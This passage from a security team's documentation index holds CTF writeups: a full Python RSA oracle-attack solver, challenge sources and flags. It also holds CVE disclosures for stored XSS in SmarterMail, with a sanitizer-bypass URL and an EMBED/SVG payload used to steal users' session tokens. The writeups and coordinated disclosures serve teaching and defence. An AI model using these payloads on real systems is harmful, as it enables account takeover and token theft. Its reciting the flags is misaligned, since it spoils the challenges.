int(re.findall(r'The Seers whisper their answer: ([0-1])', data)[0])\n        for p in copy:\n            if p in patterns and copy[p][index % len(copy[p])] != parity:\n                patterns.pop(p)\n\n    print(patterns.keys())\n    return (patterns, index)\n\n\npatterns = gen_patterns(M)\nstates,index = get_state(sock, patterns, n, c)\nprint(states)\nprint(index)\n</code></pre> <p>Now that we have the initial state, we can predict the next state and determine which oracle our input will flow to send our crafted input for the LSB oracle attack if the state is even. Otherwise, we will send an empty input to avoid the second oracle. But there is another problem. We need approximately 1024 requests to make the attack (because it performs in \\(Log_n\\) and the \\(n\\) is 1024 bit), but there is a counter that limits the total number of requests to 1500</p> <pre><code>while counter &lt;= 1500:\n</code></pre> <p>Based on the state value, around half of our requests will go to the desired oracle, which results in sending about 750 requests. The remaining requests will not be accepted by the server anymore. Therefore, the decryption process will remain unfinished, and we have to start from the beginning.</p> <p>To overcome this challenge, based on the challenge name (twin oracle), we should utilize both oracles to limit our boundaries of n to recover m, which is the flag. After searching for a noticeable amount of time, I came up with exploiting the second oracle's behavior to decrypt the flag. Although I could not find a direct reference to explain this attack, we can observe and illustrate it as an example.</p> <p>According to the code </p><pre><code>return int(decrypt(c)) &gt; (n//2)\n</code></pre><p></p> <p>if we send and encrypted text \\(C\\)</p>  $C \\equiv M^e \\mod N$  <p>it will return <code>0</code> if the decrypted message is lower than \\(n/2\\); otherwise it will return <code>1</code>. In another word,</p>  $M &gt; N/2$  $2*M &gt; N$  <p>We can use a similar approach to LSB oracle attack and start to multiply the M, which we want to decrypt by exponents of 2 and send it to the server to limit the bondaries of N which shows what ranges of N, M might be at.</p> <p>As an example:</p> <ol> <li>Let's say we send \\(C \\equiv (M)^e \\mod N\\).<ul> <li>if server returns 0 is means \\(M&lt;N/2\\) otherwise \\(M &gt; N/2\\).</li> </ul> </li> <li>Let's say we send \\(C \\equiv (2*M)^e \\mod N\\).<ul> <li>if the server returns 0 it means \\(M&lt;N/4\\) otherwise \\(M&gt;N/4\\)</li> </ul> </li> </ol> <p>Now consider we send a message like:</p>  $C_i \\equiv (2^i*M)^e \\mod N$  <ol> <li>if the answer is <code>0</code>, it means<ul> <li>\\(M &lt; N/{2^{i+1}}\\) and we should lower the upper bound to \\({L+H}/2\\)</li> </ul> </li> <li>if the answer is <code>1</code>, it means<ul> <li>\\(M &gt; N/{2^{i+1}}\\) and we should rise the lower bound to \\({L+H}/2\\)</li> </ul> </li> </ol> <p>This also looks like a binary search to limit the boundaries until we reach the exact value for M.  </p>  $H-L &lt; 1$  <p>The code to illustrate this attack is similar to the previous one, with a slight difference: the index of <code>i</code> should start from 0 instead of 1 because the server already has a <code>2</code> coefficient.</p> <pre><code>e = 65537\nupper_limit = N\nlower_limit = 0\n\nflag = \"\"\ni = 0\n# for 1024 bit N\nwhile i &lt;= 1024:\n    chosen_ct = long_to_bytes((bytes_to_long(flag_enc)*pow(2**i, e, N)) % N)\n    output = _decrypt(chosen_ct)\n    if ord(output[-1]) == 0:\n        upper_limit = (upper_limit + lower_limit)/2\n    elif ord(output[-1]) == 1:\n        lower_limit = (lower_limit + upper_limit)/2\n    else:\n        throw Exception\n    i += 1\n\n# Decrypted ciphertext\nprint long_to_bytes(upper_limit)\n</code></pre> <p>Since we have to use both Oracles simultaneously without exceeding the limit(1500 requests), we should somehow combine these two algorithms. The algorithms are exactly the same except for the starting index. However, for the operation on upper and lower bounds, I was not sure how to combine these two algorithms. Should I choose two different sets of bounds, or was one enough? After choosing one pair, it worked.</p> <p>So here is the code to attack the oracles</p> <pre><code>def oracle_attack(N, e, C, oracle, index, M):\n\n    low = 0\n    high = N\n\n    x = list(patterns.keys())[0]\n    print(x)\n    for i in range(index):\n        x = pow(x, 2, M)\n\n    i = 1\n    j = 0\n\n    while abs(high-low):\n\n        print(f'counter : {counter}')\n\n        x = pow(x, 2, M)\n        if x % 2 == 0:\n            po = pow(2, e*i, n)\n            ct = (po * C) % n\n            parity = oracle(sock, ct)\n\n            if parity == 0:\n                high = (low+high) // 2\n            else:\n                low = (low+high+1) // 2\n\n            i += 1\n            j += 1\n\n        else:\n            po = pow(2, e*j, n)\n            ct = (po * C) % n\n            parity = oracle(sock, ct)\n\n            if parity == 0:\n                high = (low+high) // 2\n            else:\n                low = (low+high+1) // 2\n\n            i += 1\n            j += 1\n\n        print(high)\n        print(low)\n\n    return low\n</code></pre> <p>Notice that we should get the current state before attacking the oracles by repeating the random number generator operation.</p> <pre><code>x = list(patterns.keys())[0]\nprint(x)\nfor i in range(index):\n    x = pow(x, 2, M)\n</code></pre>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/#final-code","title":"Final Code","text":"<p>The final code to automate the process:</p> <pre><code>import socket\nfrom time import sleep\nimport re\nfrom Crypto.Util.number import *\n\n# host = '83.136.254.73'\n# port = 57362\n\nhost = '127.0.0.1'\nport = 50001\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((host, port))\n\ncounter = 0\n\ndef recvall(sock, buffer_size=4096, end_marker=None, timeout=0.1):\n\n    data = b\"\"\n    sock.settimeout(timeout)\n\n    try:\n        while True:\n            chunk = sock.recv(buffer_size)\n            if not chunk:\n                break\n\n            data += chunk\n            if end_marker and end_marker in data:\n                data = data.split(end_marker)[0]\n                break\n\n    except socket.timeout:\n        pass\n\n    return data\n\ndef gen_patterns(M):\n\n    patterns = {}\n    for i in range(2**14, 2**15):\n\n        if isPrime(i):\n            x = i\n            patterns[i] = []\n            gens = [x]\n            counter = 0\n\n            while counter &lt; 1000:\n                x = pow(x, 2, M)\n                if not (x in gens):\n                    counter = 0\n                    gens.append(x)\n\n                counter += 1\n\n            for g in gens:\n                patterns[i].append(g % 2)\n    return patterns\n\n\ndef get_state(sock, patterns, n, c):\n\n    global counter\n\n    index = 0\n    # reverse_dict = {tuple(v): k for k, v in patterns.items()}\n    copy = patterns.copy()\n\n\n    while len(patterns) != 1 and counter &lt; 30:\n\n        counter += 1\n        ct = 0\n        ct = pow((n//100)*80, 0x10001, n)\n\n        sock.sendall(b'2\\n')\n        recvall(sock, 4096)\n        sock.sendall(f'{hex(ct)[2:]}\\n'.encode())\n        data = recvall(sock, 4096).decode()\n        # print(data)\n\n        index += 1\n        parity = int(re.findall(r'The Seers whisper their answer: ([0-1])', data)[0])\n        print(parity)\n        # parity = test_oracle()\n        for p in copy:\n            if p in patterns and copy[p][index % len(copy[p])] != parity:\n                patterns.pop(p)\n\n        print(len(patterns))\n\n    print(patterns.keys())\n    return (patterns, index)\n\n\ndef oracle(sock, ct):\n\n    global counter\n    counter += 1\n\n    sock.sendall(b'2\\n')\n    recvall(sock, 4096)\n    sock.sendall(f'{hex(ct)[2:]}\\n'.encode())\n    data = recvall(sock, 4096).decode()\n    # print(data)\n\n    answer = int(re.findall(r'The Seers whisper their answer: ([0-9])', data)[0])\n    return answer\n\n\n\ndef oracle_attack(N, e, C, oracle, index, M):\n\n    low = 0\n    high = N\n\n    x = list(patterns.keys())[0]\n    print(x)\n    for i in range(index):\n        x = pow(x, 2, M)\n\n    i = 1\n    j = 0\n\n    while abs(high-low):\n\n        print(f'counter : {counter}')\n\n        x = pow(x, 2, M)\n        if x % 2 == 0:\n            po = pow(2, e*i, n)\n            ct = (po * C) % n\n            parity = oracle(sock, ct)\n\n            if parity == 0:\n                high = (low+high) // 2\n            else:\n                low = (low+high+1) // 2\n\n            i += 1\n            j += 1\n            # pass\n\n        else:\n            po = pow(2, e*j, n)\n            ct = (po * C) % n\n            parity = oracle(sock, ct)\n\n            if parity == 0:\n                high = (low+high) // 2\n            else:\n                low = (low+high+1) // 2\n\n            i += 1\n            j += 1\n            # pass\n\n        print(high)\n        print(low)\n\n    return low\n\n\n\ndata = recvall(sock, 4096)\nprint(data.decode())\n\nM = int(re.findall(r'M = ([0-9]+)', data.decode())[0])\n\nsock.sendall(b'1\\n')\n\ndata = recvall(sock, 4096)\nprint(data.decode())\n\n\nn = int(re.findall(r'n = ([0-9]+)', data.decode())[0])\nc = int(re.findall(r'The ancient script has been sealed: ([0-9]+)', data.decode())[0])\n\npatterns = gen_patterns(M)\n\n\nstates,index = get_state(sock, patterns, n, c)\nprint(states)\nprint(index)\n\nm = oracle_attack(n, 0x10001, c, oracle, index, M)\nflag = long_to_bytes(m)\nprint(flag)\n</code></pre> <p>And here is the process and extracted flag(the last byte could get fixed by just subtracting 1 from the final M)</p> <p></p>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/#flag","title":"Flag","text":"<pre><code>HTB{1_l0v3_us1ng_RS4_0r4cl3s___3v3n_4_s1ngl3_b1t_1s_3n0ugh_t0_g3t_m3_t0_3ld0r14!_723d443d2e3da66d924780cf2a55953c}\n</code></pre>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/#authors","title":"Authors","text":"<p>Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/","title":"Index","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/","title":"Gotam","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/#twin-oracle","title":"Twin Oracle","text":"Category Difficulty Score Solves First \ud83e\ude78 Crypto Baby \ud83d\udc76 98 46 Pwnguins"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/#code-description","title":"Code / Description","text":"<pre><code>Calling Gotam a \"challenge\" is like calling a nap \"extreme sports\" :D\n\nnc 65.109.194.34 13131\n</code></pre> <pre><code>#!/usr/bin/env python3\n\nimport sys\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef die(*args):\n    pr(*args)\n    quit()\n\ndef pr(*args):\n    s = \" \".join(map(str, args))\n    sys.stdout.write(s + \"\\n\")\n    sys.stdout.flush()\n\ndef sc():\n    return sys.stdin.buffer.readline()\n\ndef check_nr(a, p, q):\n    return pow(a, (p - 1) // 2, p) == p - 1 and pow(a, (q - 1) // 2, q) == q - 1\n\ndef gotam(nbit):\n    p, q = [getPrime(nbit) for _ in ':)']\n    n = p * q\n    while True:\n        t = getRandomRange(1, n - 1)\n        if check_nr(t, p, q):\n            break\n    return (n, t), (p, q)\n\ndef encrypt(msg, pubkey):\n    n, t = pubkey\n    M = bin(bytes_to_long(msg))[2:].zfill(1 &lt;&lt; 10)\n    l = len(M)\n    E = [\n        t ** int(M[_]) * getRandomNBitInteger(n.bit_length() - 1) ** 2 % n\n        for _ in range(l)\n    ]\n    return E\n\ndef main():\n    border = \"\u2503\"\n    pr(\n        \"\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\"\n    )\n    pr(\n        border,\n        \"Unlock Gotam's tailored encryption\u2014can you outsmart this custom asymmetric enigma?\",\n        border,\n    )\n    pr(\n        \"\u2517\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u251b\"\n    )\n    pubkey, privkey = gotam(128)\n    del privkey\n    while True:\n        pr(\n            f\"{border} Options: \\n{border}\\t[E]ncrypt flag \\n{border}\\t[P]ublic data \\n{border}\\t[Q]uit\"\n        )\n        ans = sc().decode().strip().lower()\n        if ans == \"e\":\n            enc = encrypt(flag, pubkey)\n            for e in enc:\n                pr(border, f\"{hex(e) = }\")\n        elif ans == \"p\":\n            pr(border, \"n, t = \", \", \".join(map(hex, pubkey)))\n        elif ans == \"q\":\n            die(border, \"Quitting...\")\n        else:\n            die(border, \"Bye...\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/#overview","title":"Overview","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/#challenge-analysis","title":"Challenge Analysis","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/#solution","title":"Solution","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/#final-code","title":"Final Code","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/#flag","title":"Flag","text":"<pre><code>ASIS{Priv4te_c0mpari5oN_iZ_fundAm3ntaL_7O_s3cuRe_mult1pArtY_cOmpuTatIons!}\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Gotam/#authors","title":"Authors","text":"<p>Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/","title":"Techras","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/#twin-oracle","title":"Twin Oracle","text":"Category Difficulty Score Solves First \ud83e\ude78 Crypto Baby \ud83d\udc76 29 301 G3"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/#code-description","title":"Code / Description","text":"<pre><code>I'm having trouble determining when to discard a number versus when to reuse it in Techras. Any advice would be helpful!\n</code></pre> <pre><code>#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *\nfrom string import *\nfrom flag import flag\n\ndef pad(flag):\n    r = len(flag) % 8\n    if r != 0:\n        flag = flag[:-1] + (8 - r) * printable[:63][getRandomRange(0, 62)].encode() + flag[-1:]\n    return flag\n\ndef genkey(nbit):\n    p, q = [getPrime(nbit) for _ in ':)']\n    n = p * q\n    return n, (p, q)\n\ndef encrypt(msg, pubkey):\n    msg = pad(msg)\n    e = getPrime(32)\n    m = bytes_to_long(msg)\n    c = pow(m, e, pubkey)\n    return str(c) + str(e)\n\nnbit = 1024\npubkey, _ = genkey(nbit)\n\nprint(f'n = {pubkey}')\nfor _ in range(110):\n    print(f'c = {encrypt(flag, pubkey)}')\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/#overview","title":"Overview","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/#challenge-analysis","title":"Challenge Analysis","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/#solution","title":"Solution","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/#final-code","title":"Final Code","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/#flag","title":"Flag","text":"<pre><code>ASIS{d0nT___rEuS3___peXp!}\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/Techras/#authors","title":"Authors","text":"<p>Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/","title":"Techras II","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/#twin-oracle","title":"Twin Oracle","text":"Category Difficulty Score Solves First \ud83e\ude78 Crypto Baby \ud83d\udc76 71 69 TheBacterias"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/#code-description","title":"Code / Description","text":"<pre><code>Thanks to the guidance on the Techras challenge, I've learned a lot. I think I finally understand when to discard a number versus when to reuse it. To be honest, I feel like I've got it all figured out now with Techras II. Don't you agree?\n</code></pre> <pre><code>#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *\nfrom string import *\nfrom flag import flag\n\ndef pad(flag):\n    r = len(flag) % 8\n    if r != 0:\n        flag = flag[:-1] + (8 - r) * printable[:72][getRandomRange(0, 71)].encode() + flag[-1:]\n    return flag\n\ndef genkey(nbit):\n    e = getPrime(64)\n    p, q = [getPrime(nbit) for _ in ':)']\n    n = p * q\n    return (e, n), (p, q)\n\ndef encrypt(msg, pubkey):\n    e, n = pubkey\n    msg = pad(msg)\n    m = bytes_to_long(msg)\n    c = pow(m, e, n)\n    return c\n\nnbit = 1024\npubkey, _ = genkey(nbit)\n\ne, n = pubkey\nprint(f'n = {n}')\nfor _ in range(25):\n    print(f'c = {encrypt(flag, (e, n))}')\n    e += 2\nprint(f'e = {e}')\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/#overview","title":"Overview","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/#challenge-analysis","title":"Challenge Analysis","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/#solution","title":"Solution","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/#final-code","title":"Final Code","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/#flag","title":"Flag","text":"<pre><code>ASIS{Us3___L4r9eR___PexP!}\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/crypto/TechrasII/#authors","title":"Authors","text":"<p>Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/","title":"Idolatress I","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/#twin-oracle","title":"Twin Oracle","text":"Category Difficulty Score Solves First \ud83e\ude78 Crypto Baby \ud83d\udc76 334 7 Brunnerne"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/#code-description","title":"Code / Description","text":"<pre><code>Functions are used on this page: http://65.109.194.34:31337\n\nIdolatress I that seem understandable. Do your best to find the flag?\n</code></pre> <pre><code>#!/usr/bin/env python3\n\nfrom flask import Flask, Response, abort\nfrom secret import my_encoder, my_decoder, flag\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    with open(__file__, \"r\", encoding = \"utf-8\") as f:\n        source = f.read()\n    for i in range(2, 10):\n        source += f\"\\n{i}: {my_encoder(i)}\"\n    return Response(source, mimetype = \"text/plain\")\n\n@app.route(\"/data/&lt;path:value&gt;\")\ndef data(value: str):\n    if len(value) != 72:\n        return abort(400, \"Parameter must be exactly 72 characters long :|\")\n    try:\n        decoded = my_decoder(value)\n        if decoded == 1:\n            return Response(flag, mimetype = \"text/plain\")\n        else:\n            return Response(f\"{decoded} {value}\", mimetype = \"text/plain\")\n    except:\n        return abort(400, \"Bad Value!\")\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port = 5000, debug = True)\n\n2: g12pXA6R5M8EywXlDBVEA762Pr1gO3GWpmbk5ezJn4KRjLMvYok5xQZNq809WKkGqyDJ43LO\n3: g8xlnDX7wkZ58D0r6qw143jxEYgLPQZOpnel5aKBzyVXvAWJ29Nl7MGmkRo5LJ0AGqNWV2yB\n4: zop1YkV68O4qG8N9LzxkPZWjR7BErm0wMvbmOeYAlO1nqVyD42op63KgJQ5XmXyl5ZQRgrKN\n5: kmEWDyx1jV6lZjlOWLnG5q2wNDm8VvJ4openRe7Az1XPYRrKM3xBy9Qk6Eg05OJZvBNKGqRL\n6: X2GA7jZYlRMvV84j5K6m2oG9v1ZzQABWJxbojagwOL0EMrNYp3nR7DlykPqXyV43g9E0DwmK\n7: gWqBE0Rk61XoBAloX50DL6rwOg3KWYxk8mep2bMyJNjQ9vGE7PqVnR2p4Z1zYjlJ7AVnvM8D\n8: 7ZKjXy4r3nEmkDJ1jB590wGoANR8M7Vl4zbq2dprOZqEgL3m2XyYKvQnP6WxJ26pM1A0RDO8\n9: XDOBmyopJ1Qj182mDwPjZEkqNz7x3VXyMYerEdOBQn6LlRGJ54rKgoWv0pA907vV8wMYz3GA\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/#overview","title":"Overview","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/#challenge-analysis","title":"Challenge Analysis","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/#solution","title":"Solution","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/#final-code","title":"Final Code","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/#flag","title":"Flag","text":"<pre><code>ASIS{g0OD_7rY_!n_F1NdinG5_HID!!}\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressI/#authors","title":"Authors","text":"<p>Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/","title":"Idolatress II","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/#twin-oracle","title":"Twin Oracle","text":"Category Difficulty Score Solves First \ud83e\ude78 Crypto Baby \ud83d\udc76 354 6 Brunnerne"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/#code-description","title":"Code / Description","text":"<pre><code>Although you have solved the first part of the Idolatress I challenge, it seems you will face some difficulty http://65.109.194.34:13371 with Idolatress II.\n\nWeb ideas mixed with a bit of mathematics are always fascinating!\n</code></pre> <pre><code>from flask import Flask, Response, abort\nfrom secret import my_encoder, my_decoder, flag\n\n\napp = Flask(__name__)\n\n\n@app.route(\"/\")\ndef index():\n    with open(__file__, \"r\", encoding=\"utf-8\") as f:\n        source = f.read()\n    return Response(source, mimetype=\"text/plain\")\n\n\n@app.route(\"/oracle/&lt;path:value&gt;\")\ndef oracle(value: str):\n    if not value.isdigit(): return abort(400, \"Bad Value!\")\n    if int(value) &gt; 2000: return abort(400, \"Bad Value!\")\n    return Response(f\"{value} {my_encoder(int(value))}\", mimetype=\"text/plain\")\n\n\n@app.route(\"/data/&lt;path:value&gt;\")\ndef data(value: str):\n    try:\n        decoded = my_decoder(value)\n        if decoded == 2 ** 313:\n            return Response(flag, mimetype=\"text/plain\")\n        else:\n            return Response(f\"{decoded} {value}\", mimetype=\"text/plain\")\n    except:\n        return abort(400, \"Bad Value!\")\n\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5000, debug=True)\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/#overview","title":"Overview","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/#challenge-analysis","title":"Challenge Analysis","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/#solution","title":"Solution","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/#final-code","title":"Final Code","text":""},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/#flag","title":"Flag","text":"<pre><code>ASIS{Hashids_iZ_3nc0ding5_NOT_r3AL_HASH!!}\n</code></pre>"},{"location":"CTF/writeups/2025/Iran-Tech-Olympics-CTF-2025/web/IdolatressII/#authors","title":"Authors","text":"<p>Kourosh Rajabzadeh</p>"},{"location":"CVE/","title":"CVE","text":""},{"location":"CVE/#cve","title":"CVE","text":"<p>List of CVEs our team members have discovered during their research</p> <ol> <li>Stored XSS in Email Body of SmarterMail (CVE-2023-48114)</li> <li>Stored DOM XSS in Email Body of SmarterMail (CVE-2023-48115)</li> <li>Stored XSS in Calendar component of SmarterMail (CVE-2023-48116)</li> </ol>"},{"location":"CVE/CVE-2023-48114/","title":"Stored XSS in Email Body of SmarterMail (CVE-2023-48114)","text":""},{"location":"CVE/CVE-2023-48114/#summary","title":"Summary","text":"<p>SmarterMail 16.x 8495 through 8664 had a vulnerability in its Anti-XSS mechanism, leading to stored cross-site scripting. With a normal-access account, an attacker could potentially take over other users' accounts by sending an email containing malicious JavaScript code.</p> <p>In order to mitigate this vulnerability Install the latest application patch (Build 8747).</p>"},{"location":"CVE/CVE-2023-48114/#impact","title":"Impact","text":"<p>It is possible to take over a victim's account when they open their inbox.</p>"},{"location":"CVE/CVE-2023-48114/#technical-details","title":"Technical Details","text":"<p>While auditing the code to gain a fundamental understanding of the application, everything initially appeared to be in order. All user inputs seemed to pass through a sanitization function, designed to filter out any harmful tags and attributes. Curiosity led me to delve deeper into the sanitization function's implementation and logic, aiming to uncover any potential flaws.</p> <p>After analyzing the sanitization function for a few minutes, something drew my attention. It appeared that the function was invoked with specific whitelists and blacklists.</p> <p></p> *List of forbidden tag names* <p></p> *List of allowed URLs to be used in SRC attributes* <p>The flawed code that uses these two lists is as follows:</p> <p></p> *The flawed sanitizer* <p>Looking at the code, we realize that it checks the presence of blacklisted elements in the given text. If an element is blacklisted, the code then checks whether it is an iframe or embed tag with attributes. Subsequently, it inspects whether the src attribute starts with the whitelisted iframe sources. If all the conditions are met, it will allow the element and won't mark it as unsafe code; otherwise, it will remove the element from the text. </p> <p>There is also a flaw in the URL validation process against the whitelist. Consequently, a URL like this is considered valid by the sanitizer:</p> <pre><code>https://youtube.com@attacker.com\n</code></pre> <p>I believed I had everything I needed to execute an XSS attack, so I attempted to exploit the vulnerability using an embed tag and a SVG payload on my server. However, that's when CSP came into play. The CSP header was as follows:</p> <p></p> *The frame-ancestor directive is set to self* <p>The frame-ancestors directive is configured to 'self', preventing us from serving the payload on our server. Consequently, we needed to upload the SVG file directly onto the mail server. The application offers a file storage feature allowing uploads of various file types onto the server. However, upon uploading the file, a new obstacle emerged: the Content-Disposition Header. Its value was set to 'attachment', implying that the file wouldn't render in the browser but trigger a download instead. This presented yet another challenge that needed resolution.</p> <p></p> *Content-Disposition header is set to attachment* <p>While reviewing the code for an endpoint allowing file uploads and inline viewing, I identified a suitable endpoint that fulfilled my requirements.</p> <p></p> *Endpoint without Content-Disposition header* <p>Finally we can go for the ultimate payload creation and exploitation. The payload will become as follows:</p> <pre><code>&lt;EMBED SRC=\"//youtube.com@{link}\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;\n</code></pre> <p>You need to replace {link} with URL of SVG file you uploaded on the server previously. Then you will put this payload in the messageHTML parameter and send the email to victim. Upon opening their inbox, the payload will execute. I've created an exploit to demonstrate the severity of this vulnerability, allowing the extraction of the victim's accessToken and refreshToken, forwarding them to the attacker's email address. The accompanying image depicts the result of this exploit.</p> <p></p> *Endpoint without Content-Disposition header*"},{"location":"CVE/CVE-2023-48114/#vendor-communication","title":"Vendor Communication","text":"<pre><code>07/11/2023: Issues were reported to the vendor\n29/11/2023: A BETA version was released \n05/12/2023: I tested the BETA version and confirmed issues were fixed\n13/12/2023: A patch (Build 8747) was released\n18/12/2023: Public disclosure   \n</code></pre> <p>Discovered by Coeus</p>"},{"location":"CVE/CVE-2023-48115/","title":"Stored DOM XSS in Email Body of SmarterMail (CVE-2023-48115)","text":""},{"location":"CVE/CVE-2023-48115/#summary","title":"Summary","text":"<p>A Stored DOM XSS vulnerability exists in the email message component of the SmarterMail product version 16.x 8495 through 8664. An attacker can exploit this by inserting malicious HTML or JavaScript code into the message body. Upon the victim opening the message, the embedded malicious script will execute.</p> <p>In order to mitigate this vulnerability Install the latest application patch (Build 8747).</p>"},{"location":"CVE/CVE-2023-48115/#impact","title":"Impact","text":"<p>It is possible to take over a victim's account when they open their inbox.</p>"},{"location":"CVE/CVE-2023-48115/#technical-details","title":"Technical Details","text":"<p>While auditing the client-side code, I noticed an effective JavaScript sanitization function in place. However, upon closer inspection, I identified a logic flaw within the sanitization process. This flaw, if combined with a backend weakness, could potentially lead to an XSS exploit. The flawed code is as follows:</p> <p></p> *vulnerable JS code* <p>The code checks whether the <code>messageHTML</code> parameter in the HTTP response is either empty or equals <code>&lt;br&gt;</code>. If this condition is met, it sets the value of <code>messagePlainText</code> as innerHTML. Typically, when composing a new email and including HTML code, the server sanitizes the HTML and places it into <code>messagePlainText</code>. However, I considered the scenario of setting both <code>messageHTML</code> and <code>messagePlainText</code> in the same request.</p> <p>The backend code exhibits a vulnerability where if the received request contains the <code>messagePlainText</code> parameter, the server omits the sanitation process for the <code>messageHTML</code> value and updates the <code>PlainText</code> value without proper sanitization.</p> <p></p> *modified request* <p>After the victim opens their inbox and views your email, the malicious code will execute, as demonstrated below:</p> <p></p> *Alerted Token*"},{"location":"CVE/CVE-2023-48115/#vendor-communication","title":"Vendor Communication","text":"<pre><code>07/11/2023: Issues were reported to the vendor\n29/11/2023: A BETA version was released \n05/12/2023: I tested the BETA version and confirmed issues were fixed\n13/12/2023: A patch (Build 8747) was released\n18/12/2023: Public disclosure\n</code></pre> 